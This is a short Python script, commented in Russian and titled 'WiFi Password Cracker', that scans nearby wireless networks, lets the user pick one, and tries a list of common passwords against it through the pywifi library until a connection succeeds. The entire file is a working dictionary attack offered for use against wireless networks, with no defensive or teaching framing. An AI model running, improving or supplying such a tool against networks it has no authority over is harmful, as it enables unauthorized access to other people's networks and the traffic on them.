import pywifi
import time
from pywifi import const

def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()  # Сканируем доступные сети
    time.sleep(2)  # Ждем завершения сканирования
    results = iface.scan_results()
    networks = []
    
    for network in results:
        networks.append(network.ssid)  # Сохраняем названия сетей
    return networks

def test_password(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()  # Отключаемся от текущей сети
    time.sleep(5)  # Ждем отключения

    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        iface.remove_all_network_profiles()  # Удаляем все профили
        tmp_profile = iface.add_network_profile(profile)  # Добавляем новый профиль

        try:
            iface.connect(tmp_profile)  # Подключаемся к сети
            time.sleep(1)  # Ждем некоторое время для подключения

            if iface.status() == const.IFACE_CONNECTED:
                print(f'Success! Password for {ssid} is {password}')
                iface.disconnect()  # Отключаемся после успешного подключения
                return True
            else:
                print(f'Failed to connect to {ssid} with password: {password}')
                return False
        except Exception as e:
            print(f'Error while trying to connect to {ssid} with password: {password}. Error: {e}')
            return False
    else:
        print(f'Interface status is not disconnected for network {ssid}')
        return False

def main():
    print("Welcome to the WiFi Password Cracker")
    networks = scan_networks()  # Получаем список доступных сетей
    print("Available networks:")
    
    for i, network in enumerate(networks, start=1):
        print(f"{i}. {network}")
    
    choice = int(input("Select a network (enter the number): "))
    
    if 1 <= choice <= len(networks):
        selected_network = networks[choice - 1]
        print(f"Selected network: {selected_network}")
        
        passwords = ['12345', '1234', 'password', 'qwerty', '123456789', 
                     '24058917', '12345678', '1234567', '111111', '123456']
        
        for password in passwords:
            if test_password(selected_network, password):
                break  # Выходим, если подключение успешно

    else:
        print("Invalid choice. Exiting.")

if __name__ == "__main__":
    main()
